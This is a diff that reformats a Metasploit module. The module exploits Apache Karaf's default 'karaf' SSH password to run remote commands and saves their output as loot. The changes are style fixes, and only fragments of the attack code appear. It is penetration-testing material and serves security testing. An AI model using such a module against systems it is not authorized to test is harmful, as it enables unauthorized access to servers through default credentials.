@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -11,28 +12,28 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::SSH
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => "Apache Karaf Default Credentials Command Execution",
-      'Description'    => %q{
-        This module exploits a default misconfiguration flaw on Apache Karaf versions 2.x-4.x.
-        The 'karaf' user has a known default password, which can be used to login to the
-        SSH service, and execute operating system commands from remote.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Nicholas Starke <nick@alephvoid.com>'
-        ],
-      'Platform'       => 'unix',
-      'Arch'           => ARCH_CMD,
-      'Targets'        =>
-        [
-          ['Apache Karaf', {}],
-        ],
-      'Privileged'     => true,
-      'DisclosureDate' => "Feb 9 2016",
-      'DefaultTarget'  => 0))
+                      'Name'           => "Apache Karaf Default Credentials Command Execution",
+                      'Description'    => %q(
+                        This module exploits a default misconfiguration flaw on Apache Karaf versions 2.x-4.x.
+                        The 'karaf' user has a known default password, which can be used to login to the
+                        SSH service, and execute operating system commands from remote.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Nicholas Starke <nick@alephvoid.com>'
+                        ],
+                      'Platform'       => 'unix',
+                      'Arch'           => ARCH_CMD,
+                      'Targets'        =>
+                        [
+                          ['Apache Karaf', {}]
+                        ],
+                      'Privileged'     => true,
+                      'DisclosureDate' => "Feb 9 2016",
+                      'DefaultTarget'  => 0))
 
     register_options(
       [
@@ -80,7 +81,7 @@ class MetasploitModule < Msf::Auxiliary
       non_interactive: true
     }
 
-    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
+    opts[:verbose] = :debug if datastore['SSH_DEBUG']
 
     begin
       ssh = ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
@@ -120,9 +121,9 @@ class MetasploitModule < Msf::Auxiliary
       if output
         print_good("#{ip}:#{rport} - Command successfully executed.  Output: #{output}")
         store_loot("apache.karaf.command",
-                "text/plain",
-                ip,
-                output)
+                   "text/plain",
+                   ip,
+                   output)
         vprint_status("#{ip}:#{rport} - Loot stored at: apache.karaf.command")
       else
         print_error "#{ip}:#{rport} - Command failed to execute"
